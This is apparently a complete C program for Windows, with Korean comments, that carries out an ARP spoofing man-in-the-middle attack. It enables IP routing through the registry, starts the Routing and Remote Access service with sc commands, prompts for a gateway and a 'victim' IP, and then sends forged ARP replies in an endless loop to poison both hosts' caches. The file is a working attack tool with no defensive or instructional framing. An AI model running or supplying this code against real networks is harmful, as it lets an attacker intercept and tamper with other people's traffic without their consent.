#define _CRT_SECURE_NO_WARNINGS		 
#include <stdio.h>					
#include <stdlib.h>					
#include <libnet.h>
#include <windows.h>	

#pragma comment(lib, "libnet.lib")	 
#pragma comment(lib, "ws2_32.lib")    

struct ether_addr {                     // 이더넷 주소 구조체
	unsigned char mac_add[6];
};

int main() {
	int count = 0;
	pcap_if_t *alldevs;
	char errbuf[LIBNET_ERRBUF_SIZE];
	char *device = NULL;

	uint8_t src_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
	uint8_t dst_mac[6] = { 0x00,0x0c,0x29,0x97,0xbc,0x04 };
	uint8_t gate_mac[6] = { 0x00,0x50,0x56,0xe6,0x1f,0xc2 };
	uint32_t src_ip, gate_ip, dst_ip;
	struct libnet_ether_addr *smac;
	libnet_t *l, *m;


	// 레지스트리 키 불러오기
	HKEY hKey;
	DWORD dwValue = 1;
	LONG lResult = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters",
		0,
		KEY_ALL_ACCESS,
		&hKey);

	if (lResult != ERROR_SUCCESS) {
		printf("Reg Key open failure: %ld\n", lResult);
		return 1;
	}

	//불러온 키의 값 변경하기
	lResult = RegSetValueEx(
		hKey,
		L"IPEnableRouter",
		0,
		REG_DWORD,
		(BYTE*)&dwValue,
		sizeof(dwValue));
	RegCloseKey(hKey);

	if (lResult != ERROR_SUCCESS) {
		printf("Reg config failure\n");
		return 1;
	}


	//Routing and Remote Access 서비스 자동 시작 활성화
	lResult = system("sc config RemoteAccess start=auto");
	if (lResult != 0) {
		printf("sc config failure\n");
		return 1;
	}

	//Routing and Remote Access 서비스 즉시 시작하기(시작 안되어있을경우)
	lResult = system("sc query RemoteAccess | find \"RUNNING\" > nul");
	if (lResult == 0) {
		printf("sc Remote Access already Start\n");
	}
	else {
		system("sc start RemoteAccess");
	}

	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	device = alldevs->name; 			//get the first Card name


	char addr[50];
	memset(addr, 0, 50);

	printf("Gateway IP: ");
	scanf("%s", addr);
	gate_ip = inet_addr(addr);
	printf("Victim IP: ");
	scanf("%s", addr);
	dst_ip = inet_addr(addr);
	printf("\n");

	// libnet 초기화
	l = libnet_init(
		LIBNET_LINK,			/* injection type */
		device,                            	/* network interface */
		errbuf);
	m = libnet_init(
		LIBNET_LINK,
		device,
		errbuf);

	if (l == NULL) {
		fprintf(stderr, "Failed to initialize l: %s\n", errbuf);
		exit(1);
	}
	if (m == NULL) {
		fprintf(stderr, "Failed to initialize m: %s\n", errbuf);
		exit(1);
	}

	pcap_freealldevs(alldevs);

	src_ip = libnet_get_ipaddr4(l);
	smac = libnet_get_hwaddr(l);
	memcpy(src_mac, smac, 6);


	//Reply for gateway
	libnet_autobuild_arp(
		ARPOP_REPLY,
		src_mac,				//공격자 MAC
		(uint8_t *)&dst_ip,		// 피해자 IP 
		gate_mac,			          // 목적지 gateway			
		(uint8_t *)&gate_ip,
		l);
	libnet_autobuild_ethernet(
		gate_mac,
		ETHERTYPE_ARP,
		l);

	//Reply for victim
	libnet_autobuild_arp(
		ARPOP_REPLY,
		src_mac,				// 공격자 MAC
		(uint8_t *)&gate_ip,		// gateway IP
		dst_mac,				// 목적지 피해자
		(uint8_t *)&dst_ip,
		m);

	libnet_autobuild_ethernet(
		dst_mac,
		ETHERTYPE_ARP,
		m);


	// ARP Reply 반복
	while (1) {
		printf("---------------------------------------------");
		if ((libnet_write(l) == -1) || (libnet_write(m) == -1)) {
			fprintf(stderr, "Error for ARP Reply : %s\n", libnet_geterror(l));
			exit(EXIT_FAILURE);
		}

		else {
			printf("Sent spoofed ARP reply\n");
			count++;
			printf("Count: %d\n\n", count);
		};

		Sleep(1000);
	}
	return 0;
}
